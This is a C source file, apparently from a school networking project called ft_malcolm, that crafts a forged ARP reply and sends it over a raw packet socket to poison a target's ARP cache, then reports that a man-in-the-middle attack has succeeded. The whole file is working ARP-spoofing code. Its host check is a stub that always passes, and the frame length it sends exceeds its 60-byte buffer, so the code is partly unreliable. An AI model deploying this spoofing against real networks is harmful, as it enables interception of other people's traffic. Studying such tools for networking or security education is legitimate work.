#include "../includes/ft_malcolm.h"

int power(int i, int y){
	int ret  = 1;

	if (y == 0)
		 return (ret);
	while (y > 0){
	ret *= i;
	y--;
	}
	return (ret);
}

uint8_t hex_simple(char *s){
	uint8_t ret = 0;
	int i = 0;
	int y = ft_strlen(s) - 1;

	while (i < (int)ft_strlen(s)){
		if (s[i] == 'a')
			ret += 10 * power(16, y);
		else if (s[i] == 'b')
			ret += 11 * power(16, y);
		else if (s[i] == 'c')
			ret += 12 * power(16, y);
		else if (s[i] == 'd')
			ret += 13 * power(16, y);
		else if (s[i] == 'e')
			ret += 14 * power(16, y);
		else if (s[i] == 'f')
			ret += 15 * power(16, y);
		else
			ret += ((int)s[i] - 48) * power(16, y);
		i++;
		y--;
	}
	return (ret);
}


int check_up_target(char *s){
(void)s;
	return (0);
}

int arp_reply(char **av){
	int sock, bytes, frame_length;
	arp_hdr arphdr;
	struct sockaddr_ll device;
	unsigned char ether_frame[60];

	printf("Initialization of the ARP reply\nCheck if the target IP (%s) is up, please wait ...\n", av[3]);
	if (check_up_target(av[3]) != 0){
		printf("Unknown host IP: %s\n", av[3]);
		return (-1);
	}
	sleep(1);
	fill_arphdr(&arphdr, av);
	fill_device(&device, arphdr.sender_mac);
	frame_length = 6 + 6 + 2 + 18 + 28; // 18 = PADDIND && 28 = ARP_HDRLEN
	ft_bzero(ether_frame, 60);
	memcpy(ether_frame, arphdr.target_mac, 6 * sizeof (uint8_t));
	memcpy(ether_frame + 6, arphdr.sender_mac, 6 * sizeof (uint8_t));
	ether_frame[12] = ETH_P_ARP / 256;
	ether_frame[13] = ETH_P_ARP % 256; // => ether_frame[12] = 08 / ether_frame[13] = 06 pour correspondre avec le ETH_P_ARP = 0x0806
	memcpy(ether_frame + 14, &arphdr, 28 * sizeof (uint8_t));
	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if(sock < 0){
		perror("socket() failed");
		return (-1);
	}
	bytes = sendto(sock, ether_frame, frame_length, 0, (struct sockaddr *)&device, sizeof(device));
	if (bytes <= 0){
		perror("sendto() failed");
		return (-1);
	}
	close(sock);
	printf("Man In The Middle Attack Succeeded\nProgram Exiting\n");
	return (0);
}
